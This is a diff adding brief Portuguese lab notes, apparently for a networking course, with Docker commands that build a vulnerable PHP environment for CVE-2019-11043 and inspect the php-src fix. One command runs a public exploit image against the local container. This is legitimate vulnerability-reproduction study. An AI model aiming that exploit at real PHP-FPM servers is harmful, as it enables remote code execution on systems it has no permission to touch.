@@ -1,0 +1,17 @@
+Executar antes pq demora 3 dias pra buildar:
+
+cd reproducer
+docker build -t reproduce-cve-2019-11043 .
+
+
+------------------------------------------------------------
+
+docker run --rm --name cve-mac0352 -ti -p 1213:80 reproduce-cve-2019-11043
+
+docker run --link cve-mac0352 --rm ypereirareis/cve-2019-11043 http://cve-mac0352:80/script.php
+
+------------------------------------------------------------
+
+docker run --rm -ti reproduce-cve-2019-11043 bash
+cd php-src
+git diff ab061f95ca966731b1c84cf5b7b20155c0a1c06a
